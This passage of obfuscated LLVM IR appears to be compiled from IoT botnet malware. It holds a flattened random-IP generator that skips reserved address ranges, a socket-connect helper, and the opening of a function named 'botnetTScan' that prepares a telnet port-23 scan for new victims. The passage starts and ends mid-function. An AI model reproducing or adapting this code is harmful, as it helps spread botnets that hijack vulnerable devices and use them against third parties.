  %2685 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2686 = zext i8 %2685 to i32
  %2687 = icmp eq i32 %2686, 47
  %2688 = select i1 %2687, i32 -757875517, i32 1009109019
  store i32 %2688, i32* %switchVar
  br label %loopEnd

; <label>:2689:                                   ; preds = %loopEntry
  %2690 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2691 = zext i8 %2690 to i32
  %2692 = icmp sge i32 %2691, 224
  %2693 = select i1 %2692, i32 608336775, i32 1009109019
  store i32 %2693, i32* %switchVar
  br label %loopEnd

; <label>:2694:                                   ; preds = %loopEntry
  %2695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2696 = zext i8 %2695 to i32
  %2697 = icmp slt i32 %2696, 255
  %2698 = select i1 %2697, i32 -886816699, i32 1009109019
  store i32 %2698, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2699:                                   ; preds = %loopEntry
  %2700 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2701 = zext i8 %2700 to i32
  %2702 = icmp eq i32 %2701, 89
  %2703 = select i1 %2702, i32 1019487287, i32 1875162138
  store i32 %2703, i32* %switchVar
  br label %loopEnd

; <label>:2704:                                   ; preds = %loopEntry
  %2705 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2706 = zext i8 %2705 to i32
  %2707 = icmp eq i32 %2706, 34
  %2708 = select i1 %2707, i32 -1069145742, i32 1875162138
  store i32 %2708, i32* %switchVar
  br label %loopEnd

; <label>:2709:                                   ; preds = %loopEntry
  %2710 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2711 = zext i8 %2710 to i32
  %2712 = icmp sge i32 %2711, 96
  %2713 = select i1 %2712, i32 494798523, i32 1875162138
  store i32 %2713, i32* %switchVar
  br label %loopEnd

; <label>:2714:                                   ; preds = %loopEntry
  %2715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2716 = zext i8 %2715 to i32
  %2717 = icmp slt i32 %2716, 97
  %2718 = select i1 %2717, i32 -886816699, i32 1875162138
  store i32 %2718, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2719:                                   ; preds = %loopEntry
  %2720 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2721 = zext i8 %2720 to i32
  %2722 = icmp eq i32 %2721, 219
  %2723 = select i1 %2722, i32 1701856032, i32 1875050175
  store i32 %2723, i32* %switchVar
  br label %loopEnd

; <label>:2724:                                   ; preds = %loopEntry
  %2725 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2726 = zext i8 %2725 to i32
  %2727 = icmp sge i32 %2726, 216
  %2728 = select i1 %2727, i32 1058626026, i32 1875050175
  store i32 %2728, i32* %switchVar
  br label %loopEnd

; <label>:2729:                                   ; preds = %loopEntry
  %2730 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2731 = zext i8 %2730 to i32
  %2732 = icmp slt i32 %2731, 231
  %2733 = select i1 %2732, i32 -886816699, i32 1875050175
  store i32 %2733, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2734:                                   ; preds = %loopEntry
  %2735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2736 = zext i8 %2735 to i32
  %2737 = icmp eq i32 %2736, 23
  %2738 = select i1 %2737, i32 -1946245656, i32 1297363509
  store i32 %2738, i32* %switchVar
  br label %loopEnd

; <label>:2739:                                   ; preds = %loopEntry
  %2740 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2741 = zext i8 %2740 to i32
  %2742 = icmp sge i32 %2741, 94
  %2743 = select i1 %2742, i32 468471149, i32 1297363509
  store i32 %2743, i32* %switchVar
  br label %loopEnd

; <label>:2744:                                   ; preds = %loopEntry
  %2745 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2746 = zext i8 %2745 to i32
  %2747 = icmp slt i32 %2746, 109
  %2748 = select i1 %2747, i32 -886816699, i32 1297363509
  store i32 %2748, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2749:                                   ; preds = %loopEntry
  %2750 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2751 = zext i8 %2750 to i32
  %2752 = icmp eq i32 %2751, 178
  %2753 = select i1 %2752, i32 1680278751, i32 -1107249406
  store i32 %2753, i32* %switchVar
  br label %loopEnd

; <label>:2754:                                   ; preds = %loopEntry
  %2755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2756 = zext i8 %2755 to i32
  %2757 = icmp sge i32 %2756, 62
  %2758 = select i1 %2757, i32 391546507, i32 -1107249406
  store i32 %2758, i32* %switchVar
  br label %loopEnd

; <label>:2759:                                   ; preds = %loopEntry
  %2760 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2761 = zext i8 %2760 to i32
  %2762 = icmp slt i32 %2761, 63
  %2763 = select i1 %2762, i32 -886816699, i32 -1107249406
  store i32 %2763, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2764:                                   ; preds = %loopEntry
  %2765 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2766 = zext i8 %2765 to i32
  %2767 = icmp eq i32 %2766, 106
  %2768 = select i1 %2767, i32 761121227, i32 656331145
  store i32 %2768, i32* %switchVar
  br label %loopEnd

; <label>:2769:                                   ; preds = %loopEntry
  %2770 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2771 = zext i8 %2770 to i32
  %2772 = icmp sge i32 %2771, 182
  %2773 = select i1 %2772, i32 1037856345, i32 656331145
  store i32 %2773, i32* %switchVar
  br label %loopEnd

; <label>:2774:                                   ; preds = %loopEntry
  %2775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2776 = zext i8 %2775 to i32
  %2777 = icmp slt i32 %2776, 189
  %2778 = select i1 %2777, i32 -886816699, i32 656331145
  store i32 %2778, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2779:                                   ; preds = %loopEntry
  %2780 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2781 = zext i8 %2780 to i32
  %2782 = icmp eq i32 %2781, 106
  %2783 = select i1 %2782, i32 -703488466, i32 -1838962969
  store i32 %2783, i32* %switchVar
  br label %loopEnd

; <label>:2784:                                   ; preds = %loopEntry
  %2785 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2786 = zext i8 %2785 to i32
  %2787 = icmp sge i32 %2786, 184
  %2788 = select i1 %2787, i32 -886816699, i32 -1838962969
  store i32 %2788, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2789:                                   ; preds = %loopEntry
  %2790 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2791 = zext i8 %2790 to i32
  %2792 = icmp eq i32 %2791, 106
  %2793 = select i1 %2792, i32 1582490534, i32 610799478
  store i32 %2793, i32* %switchVar
  br label %loopEnd

; <label>:2794:                                   ; preds = %loopEntry
  %2795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2796 = zext i8 %2795 to i32
  %2797 = icmp eq i32 %2796, 105
  %2798 = select i1 %2797, i32 -886816699, i32 610799478
  store i32 %2798, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2799:                                   ; preds = %loopEntry
  %2800 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2801 = zext i8 %2800 to i32
  %2802 = icmp eq i32 %2801, 34
  %2803 = select i1 %2802, i32 -404272206, i32 504586432
  store i32 %2803, i32* %switchVar
  br label %loopEnd

; <label>:2804:                                   ; preds = %loopEntry
  %2805 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2806 = zext i8 %2805 to i32
  %2807 = icmp sge i32 %2806, 245
  %2808 = select i1 %2807, i32 -581436702, i32 504586432
  store i32 %2808, i32* %switchVar
  br label %loopEnd

; <label>:2809:                                   ; preds = %loopEntry
  %2810 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2811 = zext i8 %2810 to i32
  %2812 = icmp slt i32 %2811, 255
  %2813 = select i1 %2812, i32 -886816699, i32 504586432
  store i32 %2813, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2814:                                   ; preds = %loopEntry
  %2815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2816 = zext i8 %2815 to i32
  %2817 = icmp eq i32 %2816, 87
  %2818 = select i1 %2817, i32 -2055249202, i32 406854877
  store i32 %2818, i32* %switchVar
  br label %loopEnd

; <label>:2819:                                   ; preds = %loopEntry
  %2820 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2821 = zext i8 %2820 to i32
  %2822 = icmp sge i32 %2821, 97
  %2823 = select i1 %2822, i32 211457618, i32 406854877
  store i32 %2823, i32* %switchVar
  br label %loopEnd

; <label>:2824:                                   ; preds = %loopEntry
  %2825 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2826 = zext i8 %2825 to i32
  %2827 = icmp slt i32 %2826, 99
  %2828 = select i1 %2827, i32 -886816699, i32 406854877
  store i32 %2828, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2829:                                   ; preds = %loopEntry
  %2830 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2831 = zext i8 %2830 to i32
  %2832 = icmp eq i32 %2831, 86
  %2833 = select i1 %2832, i32 803985072, i32 -1362406930
  store i32 %2833, i32* %switchVar
  br label %loopEnd

; <label>:2834:                                   ; preds = %loopEntry
  %2835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2836 = zext i8 %2835 to i32
  %2837 = icmp eq i32 %2836, 208
  %2838 = select i1 %2837, i32 -886816699, i32 -1362406930
  store i32 %2838, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2839:                                   ; preds = %loopEntry
  %2840 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2841 = zext i8 %2840 to i32
  %2842 = icmp eq i32 %2841, 86
  %2843 = select i1 %2842, i32 -822104944, i32 -954562412
  store i32 %2843, i32* %switchVar
  br label %loopEnd

; <label>:2844:                                   ; preds = %loopEntry
  %2845 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2846 = zext i8 %2845 to i32
  %2847 = icmp eq i32 %2846, 209
  %2848 = select i1 %2847, i32 -886816699, i32 -954562412
  store i32 %2848, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2849:                                   ; preds = %loopEntry
  %2850 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2851 = zext i8 %2850 to i32
  %2852 = icmp eq i32 %2851, 193
  %2853 = select i1 %2852, i32 1134612447, i32 -1172261271
  store i32 %2853, i32* %switchVar
  br label %loopEnd

; <label>:2854:                                   ; preds = %loopEntry
  %2855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2856 = zext i8 %2855 to i32
  %2857 = icmp eq i32 %2856, 164
  %2858 = select i1 %2857, i32 -886816699, i32 -1172261271
  store i32 %2858, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2859:                                   ; preds = %loopEntry
  %2860 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2861 = zext i8 %2860 to i32
  %2862 = icmp eq i32 %2861, 120
  %2863 = select i1 %2862, i32 2073193546, i32 -622303161
  store i32 %2863, i32* %switchVar
  br label %loopEnd

; <label>:2864:                                   ; preds = %loopEntry
  %2865 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2866 = zext i8 %2865 to i32
  %2867 = icmp sge i32 %2866, 103
  %2868 = select i1 %2867, i32 -2096962310, i32 -622303161
  store i32 %2868, i32* %switchVar
  br label %loopEnd

; <label>:2869:                                   ; preds = %loopEntry
  %2870 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2871 = zext i8 %2870 to i32
  %2872 = icmp slt i32 %2871, 108
  %2873 = select i1 %2872, i32 -886816699, i32 -622303161
  store i32 %2873, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2874:                                   ; preds = %loopEntry
  %2875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2876 = zext i8 %2875 to i32
  %2877 = icmp eq i32 %2876, 188
  %2878 = select i1 %2877, i32 -41480505, i32 963518571
  store i32 %2878, i32* %switchVar
  br label %loopEnd

; <label>:2879:                                   ; preds = %loopEntry
  %2880 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2881 = zext i8 %2880 to i32
  %2882 = icmp eq i32 %2881, 68
  %2883 = select i1 %2882, i32 -886816699, i32 963518571
  store i32 %2883, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2884:                                   ; preds = %loopEntry
  %2885 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2886 = zext i8 %2885 to i32
  %2887 = icmp eq i32 %2886, 78
  %2888 = select i1 %2887, i32 55750726, i32 -782803863
  store i32 %2888, i32* %switchVar
  br label %loopEnd

; <label>:2889:                                   ; preds = %loopEntry
  %2890 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2891 = zext i8 %2890 to i32
  %2892 = icmp eq i32 %2891, 46
  %2893 = select i1 %2892, i32 -886816699, i32 -782803863
  store i32 %2893, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2894:                                   ; preds = %loopEntry
  %2895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2896 = zext i8 %2895 to i32
  %2897 = icmp eq i32 %2896, 224
  store i32 -886816699, i32* %switchVar
  store i1 %2897, i1* %.reg2mem
  br label %loopEnd

; <label>:2898:                                   ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %2899 = select i1 %.reload, i32 466363517, i32 -1931424752
  store i32 %2899, i32* %switchVar
  br label %loopEnd

; <label>:2900:                                   ; preds = %loopEntry
  %2901 = call i32 @rand() #3
  %2902 = srem i32 %2901, 223
  %2903 = trunc i32 %2902 to i8
  store i8 %2903, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2904 = call i32 @rand() #3
  %2905 = srem i32 %2904, 255
  %2906 = trunc i32 %2905 to i8
  store i8 %2906, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2907 = call i32 @rand() #3
  %2908 = srem i32 %2907, 255
  %2909 = trunc i32 %2908 to i8
  store i8 %2909, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2910 = call i32 @rand() #3
  %2911 = srem i32 %2910, 255
  %2912 = trunc i32 %2911 to i8
  store i8 %2912, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  store i32 -535928606, i32* %switchVar
  br label %loopEnd

; <label>:2913:                                   ; preds = %loopEntry
  %2914 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %2914, i8 0, i64 16, i32 16, i1 false)
  %2915 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %2916 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2917 = zext i8 %2916 to i32
  %2918 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2919 = zext i8 %2918 to i32
  %2920 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2921 = zext i8 %2920 to i32
  %2922 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %2923 = zext i8 %2922 to i32
  %2924 = call i32 (i8*, i8*, ...) @szprintf(i8* %2915, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.92, i32 0, i32 0), i32 %2917, i32 %2919, i32 %2921, i32 %2923)
  %2925 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %2926 = call i32 @inet_addr(i8* %2925) #3
  ret i32 %2926

loopEnd:                                          ; preds = %2900, %2898, %2894, %2889, %2884, %2879, %2874, %2869, %2864, %2859, %2854, %2849, %2844, %2839, %2834, %2829, %2824, %2819, %2814, %2809, %2804, %2799, %2794, %2789, %2784, %2779, %2774, %2769, %2764, %2759, %2754, %2749, %2744, %2739, %2734, %2729, %2724, %2719, %2714, %2709, %2704, %2699, %2694, %2689, %2684, %2679, %2674, %2669, %2664, %2659, %2654, %2649, %2644, %2639, %2634, %2629, %2624, %2619, %2614, %2609, %2604, %2599, %2594, %2589, %2584, %2579, %2574, %2569, %2564, %2559, %2554, %2549, %2544, %2539, %2534, %2529, %2524, %2519, %2514, %2509, %2504, %2499, %2494, %2489, %2484, %2479, %2474, %2469, %2464, %2459, %2454, %2449, %2444, %2439, %2434, %2429, %2424, %2419, %2414, %2409, %2404, %2399, %2394, %2389, %2384, %2379, %2374, %2369, %2364, %2359, %2354, %2349, %2344, %2339, %2334, %2329, %2324, %2319, %2314, %2309, %2304, %2299, %2294, %2289, %2284, %2279, %2274, %2269, %2264, %2259, %2254, %2249, %2244, %2239, %2234, %2229, %2224, %2219, %2214, %2209, %2204, %2199, %2194, %2189, %2184, %2179, %2174, %2169, %2164, %2159, %2154, %2149, %2144, %2139, %2134, %2129, %2124, %2119, %2114, %2109, %2104, %2099, %2094, %2089, %2084, %2079, %2074, %2069, %2064, %2059, %2054, %2049, %2044, %2039, %2034, %2029, %2024, %2019, %2014, %2009, %2004, %1999, %1994, %1989, %1984, %1979, %1974, %1969, %1964, %1959, %1954, %1949, %1944, %1939, %1934, %1929, %1924, %1919, %1914, %1909, %1904, %1899, %1894, %1889, %1884, %1879, %1874, %1869, %1864, %1859, %1854, %1849, %1844, %1839, %1834, %1829, %1824, %1819, %1814, %1809, %1804, %1799, %1794, %1789, %1784, %1779, %1774, %1769, %1764, %1759, %1754, %1749, %1744, %1739, %1734, %1729, %1724, %1719, %1714, %1709, %1704, %1699, %1694, %1689, %1684, %1679, %1674, %1669, %1664, %1659, %1654, %1649, %1644, %1639, %1634, %1629, %1624, %1619, %1614, %1609, %1604, %1599, %1594, %1589, %1584, %1579, %1574, %1569, %1564, %1559, %1554, %1549, %1544, %1539, %1534, %1529, %1524, %1519, %1514, %1509, %1504, %1499, %1494, %1489, %1484, %1479, %1474, %1469, %1464, %1459, %1454, %1449, %1444, %1439, %1434, %1429, %1424, %1419, %1414, %1409, %1404, %1399, %1394, %1389, %1384, %1379, %1374, %1369, %1364, %1359, %1354, %1349, %1344, %1339, %1334, %1329, %1324, %1319, %1314, %1309, %1304, %1299, %1294, %1289, %1284, %1279, %1274, %1269, %1264, %1259, %1254, %1249, %1244, %1239, %1234, %1229, %1224, %1219, %1214, %1209, %1204, %1199, %1194, %1189, %1184, %1179, %1174, %1169, %1164, %1159, %1154, %1149, %1144, %1139, %1134, %1129, %1124, %1119, %1114, %1109, %1104, %1099, %1094, %1089, %1084, %1079, %1074, %1069, %1064, %1059, %1054, %1049, %1044, %1039, %1034, %1029, %1024, %1019, %1014, %1009, %1004, %999, %994, %989, %984, %979, %974, %969, %964, %959, %954, %949, %944, %939, %934, %929, %924, %919, %914, %909, %904, %899, %894, %889, %884, %879, %874, %869, %864, %859, %854, %849, %844, %839, %834, %829, %824, %819, %814, %809, %804, %799, %794, %789, %784, %779, %774, %769, %764, %759, %754, %749, %744, %739, %734, %729, %724, %719, %714, %709, %704, %699, %694, %689, %684, %679, %674, %669, %664, %659, %654, %649, %644, %639, %634, %629, %624, %619, %614, %609, %604, %599, %594, %589, %584, %579, %574, %569, %564, %559, %554, %549, %544, %539, %534, %529, %524, %519, %514, %509, %504, %499, %494, %489, %484, %479, %474, %469, %464, %459, %454, %449, %444, %439, %434, %429, %424, %419, %414, %409, %404, %399, %394, %389, %384, %379, %374, %369, %364, %359, %354, %349, %344, %339, %334, %329, %324, %319, %314, %309, %304, %299, %294, %289, %284, %279, %274, %269, %264, %259, %254, %249, %244, %239, %234, %229, %224, %219, %214, %209, %204, %199, %194, %189, %184, %179, %174, %169, %164, %159, %154, %149, %144, %139, %134, %129, %124, %119, %114, %109, %104, %99, %94, %89, %84, %79, %74, %69, %64, %59, %54, %49, %44, %39, %34, %29, %24, %19, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define i32 @GRIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 -1843895081, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1843895081, label %first
    i32 -720815284, label %14
    i32 -623626434, label %15
    i32 -1778349115, label %38
    i32 -1023744108, label %39
    i32 755726629, label %45
    i32 -1630970169, label %46
    i32 192246294, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 -720815284, i32 -623626434
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 192246294, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #3
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #10
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #3
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #3
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 -1778349115, i32 -1023744108
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 192246294, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 755726629, i32 -1630970169
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 192246294, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 192246294, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @botnetTScan(i32, i32) #0 {
  %.reg2mem17 = alloca i32
  %.reg2mem = alloca i64
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i64 @time(i64* null) #3
  %25 = call i32 @rand_cmwc()
  %26 = zext i32 %25 to i64
  %27 = xor i64 %24, %26
  %28 = trunc i64 %27 to i32
  call void @srand(i32 %28) #3
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 23) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
